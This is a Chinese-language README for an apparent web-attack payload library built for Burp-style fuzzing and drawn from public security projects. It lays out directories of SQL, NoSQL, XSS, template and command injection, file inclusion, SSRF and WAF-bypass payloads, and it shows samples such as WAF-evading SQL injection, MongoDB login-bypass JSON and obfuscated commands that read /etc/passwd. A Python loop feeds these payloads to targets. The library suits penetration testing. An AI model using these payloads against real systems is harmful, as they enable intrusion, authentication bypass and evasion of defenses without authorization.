# AI-Burp Payload Library v2.0

大神级API参数Fuzz Payload集合，来源于GitHub顶级安全项目。

## 来源

- **PayloadsAllTheThings** - swisskyrepo/PayloadsAllTheThings
- **SecLists** - danielmiessler/SecLists  
- **FuzzDB** - fuzzdb-project/fuzzdb
- **PayloadBox** - payloadbox/sql-injection-payload-list
- **Arjun** - s0md3v/Arjun

## 目录结构

```
payloads/
├── api/                    # API参数发现
│   ├── params_common.txt   # 常见参数名 (200+)
│   └── params_sensitive.txt # 敏感参数名 (IDOR/SQLi高危)
├── sqli/                   # SQL注入
│   ├── quick.txt           # 快速检测 (7个)
│   ├── detection.txt       # 基础检测 (100+)
│   ├── auth_bypass.txt     # 登录绕过 (150+)
│   ├── time_based.txt      # 时间盲注 (100+)
│   ├── error_based.txt     # 报错注入 (50+)
│   ├── waf_bypass.txt      # WAF绕过 (100+) ⭐
│   ├── union.txt           # UNION注入
│   ├── stacked.txt         # 堆叠查询
│   ├── oob.txt             # 外带注入
│   ├── no_space.txt        # 无空格
│   ├── no_quotes.txt       # 无引号
│   ├── no_comma.txt        # 无逗号
│   └── exotic.txt          # 特殊技巧
├── nosqli/                 # NoSQL注入
│   ├── quick.txt           # 快速检测
│   └── auth_bypass.txt     # MongoDB认证绕过 ⭐
├── xss/                    # XSS
│   ├── quick.txt           # 快速检测
│   ├── basic.txt           # 基础payload
│   ├── waf_bypass.txt      # WAF绕过 ⭐
│   ├── polyglot.txt        # 多态payload
│   ├── dom.txt             # DOM XSS
│   ├── csp_bypass.txt      # CSP绕过
│   └── exotic.txt          # 特殊技巧
├── ssti/                   # 模板注入
│   ├── quick.txt           # 快速检测
│   ├── detection.txt       # 多引擎检测 ⭐
│   ├── rce.txt             # RCE payload
│   └── exotic.txt          # 特殊技巧
├── cmdi/                   # 命令注入
│   ├── quick.txt           # 快速检测
│   ├── linux.txt           # Linux命令 ⭐
│   ├── windows.txt         # Windows命令 ⭐
│   ├── blind.txt           # 盲注
│   └── exotic.txt          # 特殊技巧
├── lfi/                    # 文件包含
│   ├── quick.txt           # 快速检测
│   ├── linux.txt           # Linux路径
│   ├── php_wrappers.txt    # PHP伪协议
│   ├── bypass.txt          # 绕过技巧
│   └── exotic.txt          # 特殊技巧
├── ssrf/                   # SSRF
│   ├── quick.txt           # 快速检测
│   ├── internal.txt        # 内网探测
│   ├── cloud_metadata.txt  # 云元数据 ⭐
│   ├── bypass.txt          # 绕过技巧
│   └── exotic.txt          # 特殊技巧
└── bypass/                 # WAF绕过
    ├── cloudflare.txt      # Cloudflare ⭐
    ├── aws_waf.txt         # AWS WAF ⭐
    ├── modsecurity.txt     # ModSecurity ⭐
    ├── akamai.txt          # Akamai
    ├── imperva.txt         # Imperva
    ├── waf_space.txt       # 空格绕过
    ├── waf_encoding.txt    # 编码绕过
    ├── waf_keywords.txt    # 关键字绕过
    ├── waf_quotes.txt      # 引号绕过
    ├── waf_advanced.txt    # 高级绕过
    ├── unicode.txt         # Unicode绕过
    ├── http_smuggling.txt  # HTTP走私
    └── exotic.txt          # 特殊技巧
```

## 核心技术亮点

### 1. SQL注入WAF绕过 (sqli/waf_bypass.txt)

```sql
# 科学计数法 (AWS WAF特有漏洞)
' or 1.e('')='
1' or 1.e(1) or '1'='1
SELECT table_name FROM information_schema 1.e.tables

# MySQL条件注释
/*!50000UNION*//*!50000SELECT*/1,2,3--

# 宽字节注入 (GBK)
%bf%27 OR 1=1--
%bf' OR 1=1--
```

### 2. NoSQL注入 (nosqli/auth_bypass.txt)

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
{"$where": "1==1"}
```

### 3. SSTI检测 (ssti/detection.txt)

```
# 通用Polyglot
${{<%[%'"}}%\.

# Jinja2
{{7*7}}
{{config}}

# Freemarker
${7*7}
```

### 4. 命令注入绕过 (cmdi/linux.txt)

```bash
# 空格绕过
cat${IFS}/etc/passwd
{cat,/etc/passwd}

# 引号绕过
w'h'o'am'i
wh``oami

# 十六进制
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
```

## 使用方法

```python
from aiburp.payloads import Payloads

p = Payloads()

# 快速测试
for payload in p.sqli.quick:
    test(payload)

# WAF绕过
for payload in p.sqli.waf_bypass:
    test(payload)

# 按需加载
for payload in p.sqli.time_based:
    test(payload)

# WAF特定绕过
for payload in p.bypass.cloudflare:
    test(payload)
```

## 更新日志

### v2.0 (2025-12-20)
- 新增 `sqli/waf_bypass.txt` - 科学计数法、条件注释、宽字节注入
- 新增 `nosqli/` 目录 - MongoDB注入payload
- 新增 `api/` 目录 - API参数发现
- 更新 `sqli/auth_bypass.txt` - 150+ 登录绕过payload
- 更新 `sqli/time_based.txt` - 多数据库时间盲注
- 更新 `sqli/error_based.txt` - 多数据库报错注入
- 更新 `xss/waf_bypass.txt` - 编码、事件、协议绕过
- 更新 `ssti/detection.txt` - 多引擎检测payload
- 更新 `cmdi/linux.txt` - 空格、引号、编码绕过
- 更新 `cmdi/windows.txt` - PowerShell、CMD绕过
- 更新 `bypass/cloudflare.txt` - Cloudflare WAF绕过
- 更新 `bypass/aws_waf.txt` - AWS WAF绕过
- 更新 `bypass/modsecurity.txt` - ModSecurity绕过

## 参考资料

- [PayloadsAllTheThings - MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md)
- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
- [GoSecure - AWS WAF Bypass](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)
